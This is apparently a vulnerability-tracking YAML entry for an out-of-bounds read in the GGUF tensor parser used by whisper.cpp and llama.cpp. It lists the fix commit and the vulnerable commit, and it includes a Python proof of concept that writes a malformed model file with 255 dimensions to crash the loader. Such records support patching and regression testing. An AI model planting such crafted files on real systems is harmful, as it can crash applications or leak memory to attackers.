id: GHSA-ggml-2025-parser
title: "Out-of-bounds read in ggml tensor metadata parsing"
project: whisper.cpp

# NOTE: No CVE or formal GHSA has been assigned as of April 2026.
# This entry tracks a class of OOB-read bugs discovered by OSS-Fuzz in the
# ggml tensor metadata parsing path that affects whisper.cpp model loading.
# Internal tracking ID used until an official ID is assigned.

type: out-of-bounds-read
cwe: CWE-125
cwe_secondary: [CWE-20]

severity: MEDIUM
cvss_v3_score: 5.5

affected_versions:
  - "whisper.cpp versions before ggml parser hardening (approx < 1.7.0)"
fixed_versions:
  - "Incrementally hardened across multiple ggml commits"
affected_component: "ggml/src/gguf.cpp"
vulnerable_function: "gguf_init_from_file (tensor dimension parsing)"
trigger: >
  Open a GGUF whisper model whose tensor header specifies a n_dims value
  larger than GGML_MAX_DIMS, or specifies ne[] entries that overflow when
  multiplied.  The parser reads tensor dimension data at offsets past the
  end of the allocated header buffer.
impact: >
  Out-of-bounds read during model loading; potential crash or information
  disclosure of memory adjacent to the model header buffer.

fix_commit: "https://github.com/ggml-org/whisper.cpp/commit/8f5220d81fad6db7f221f3d977b15b8b493641f3"
vulnerable_commit: "8e391fcf3a7582a64f7adf6f95f7e87177d79e6e"
# Note: yaml originally listed "Multiple incremental ggml commits" — too vague
# to drive a checkout. The first hardening commit that closes the n_dims-OOB
# variant is `8f5220d8` (synced from ggml/709, 2024-01-29) which adds
# `ok && (info->n_dims <= GGML_MAX_DIMS)` and `gguf_tensor_info_sanitize()`.
# Verified: at parent `8e391fcf3a`, the harness triggers UBSan
# "index 5 out of bounds for type 'uint64_t [4]'" in gguf_init_from_file.
github_advisory: ""
poc_available: true
poc_link: "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-vgg9-87g3-85w8"
poc_code: |
  # Craft a minimal GGUF with n_dims > GGML_MAX_DIMS (4) to trigger OOB read
  # in gguf_init_from_file when parsing tensor metadata dimension arrays.
  # Trigger: the parser reads ne[n_dims] elements but ne[] is fixed at GGML_MAX_DIMS=4.
  import struct

  def craft_gguf_oob_ndims(filename):
      with open(filename, 'wb') as f:
          f.write(b'GGUF')                        # magic
          f.write(struct.pack('<I', 3))            # version 3
          f.write(struct.pack('<Q', 1))            # n_tensors = 1
          f.write(struct.pack('<Q', 0))            # n_kv = 0 (no metadata KV)
          # Tensor info entry
          name = b'oob_tensor'
          f.write(struct.pack('<Q', len(name)))    # name length
          f.write(name)                            # tensor name
          f.write(struct.pack('<I', 255))          # n_dims = 255 >> GGML_MAX_DIMS=4
          for _ in range(255):
              f.write(struct.pack('<q', 1))        # ne[i] = 1 for all 255 dims
          f.write(struct.pack('<I', 0))            # type = GGML_TYPE_F32
          f.write(struct.pack('<Q', 0))            # offset = 0

  craft_gguf_oob_ndims('/tmp/gguf_oob_ndims.gguf')
  # Load with whisper.cpp or llama.cpp:
  #   whisper_init_from_file('/tmp/gguf_oob_ndims.gguf')
  #   llama_load_model_from_file('/tmp/gguf_oob_ndims.gguf', params)
  # → OOB read in gguf_init_from_file when iterating ne[0..254]
poc_notes: >
  No standalone public PoC released; PoC crafted from GGUF format spec and
  gguf.cpp source analysis.  The gguf parser in ggml reads n_dims from the
  file and then iterates ne[0..n_dims-1], but the internal ggml_tensor ne[]
  array is fixed at GGML_MAX_DIMS (4) elements.  Setting n_dims=255 causes
  255 - 4 = 251 out-of-bounds reads of int64_t values adjacent to the tensor
  struct.  Affects all whisper.cpp versions before incremental ggml hardening;
  also affects llama.cpp sharing the same gguf.cpp.  The linked advisory
  (GHSA-vgg9-87g3-85w8) covers the related integer-overflow OOB write variant.

description: >
  The ggml GGUF model header parser reads n_dims and ne[] (dimension sizes)
  from untrusted model files without fully validating that n_dims is within
  GGML_MAX_DIMS or that the product of ne[] values is representable without
  overflow.  When whisper.cpp loads such a malformed model, the parser
  can read beyond the end of the allocated header region.  This issue has
  been addressed incrementally across multiple ggml hardening commits.

references:
  - "https://github.com/ggml-org/whisper.cpp/security"
  - "https://github.com/ggml-org/llama.cpp/security/advisories/GHSA-vgg9-87g3-85w8"
